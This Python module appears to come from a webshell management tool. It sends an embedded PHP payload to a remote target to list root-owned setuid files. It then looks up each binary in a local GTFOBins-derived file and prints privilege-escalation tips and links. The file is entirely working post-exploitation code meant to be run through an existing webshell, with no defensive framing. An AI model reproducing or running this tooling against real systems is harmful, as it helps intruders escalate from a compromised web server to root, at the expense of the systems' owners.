from os import path
from libs.config import color, alias
from json import loads
from libs.myapp import gget, send, is_windows


def get_php(file_path: str):
    return """function filter($f){
    if (fileowner($f) === 0){
        $perms = fileperms($f);
        return (($perms & 0x0040) ?(($perms & 0x0800) ? true : false ) : false);
    }
    return false;
}
function scan_rescursive($directory) {
    foreach(glob("$directory/*") as $item) {
        if(is_dir($item)) {
            $items=explode('/', $item);
            scan_rescursive($item);
            continue;
        }
        else if (filter(realpath($item))){
            print(realpath($item)."\\n");
        }
    }
}
$paths="%s";
foreach(explode("&",$paths) as $v){
scan_rescursive($v);}""" % file_path


@alias(True, p="find_path")
def run(find_path: str = "/usr&/bin"):
    """
    priv

    (Only for *unix) Find all files with suid belonging to root and try to get privilege escalation tips.
    ps:use & to split find_path

    eg: priv {find_path="/usr&/bin"}
    """
    if (is_windows()):
        print(color.red("\nTarget system isn't *unix\n"))
        return
    print(color.yellow(
        f"\nFinding all files with suid belonging to root in {find_path}...\n"))
    priv_tips = {}
    res = send(get_php(find_path))
    if (not res):
        print(color.red("\nFind error\n"))
        return
    suid_commands = res.r_text.strip().split("\n")
    with open(path.join(gget("root_path"), "auxiliary", "priv", "gtfo.json"), "r") as f:
        priv_tips = loads(f.read())
    print(color.green("Result:") + "\n    " +
          "\n    ".join(suid_commands) + "\n")
    print("------------------------------\n")
    print("Privilege escalation Support:\n")
    flag = False
    for cmd_path in suid_commands:
        cmd = cmd_path.split("/")[-1]
        if (cmd in priv_tips):
            if (not flag):
                flag = True
            print(color.yellow(cmd_path) +
                  f" ( https://gtfobins.github.io/gtfobins/{cmd}/ )\n")
            for k, v in priv_tips[cmd].items():
                info = '\n'.join(v)
                print(f"""{color.cyan(k)}\n{color.green(info)}\n""")
    if (not flag):
        print(color.red("No support\n"))
